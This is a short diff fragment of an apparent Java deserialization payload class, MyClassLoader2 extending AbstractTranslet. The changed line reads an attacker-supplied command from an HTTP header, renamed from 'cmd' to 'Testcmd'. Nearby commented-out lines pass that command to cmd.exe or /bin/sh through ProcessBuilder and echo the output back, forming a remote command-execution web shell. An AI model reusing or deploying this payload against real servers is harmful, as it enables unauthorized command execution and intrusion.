@@ -67,7 +67,7 @@ public class MyClassLoader2 extends AbstractTranslet {
 //                        str = (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
 //                        String str2= (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"Testecho"});
 
-                        String cmd = (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});;
+                        String cmd = (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"Testcmd"});;
 //                        String[] cmds = new String[]{"cmd.exe", "/c", "ipconfig"};
 //                        String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
 //                        String result = new String((new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
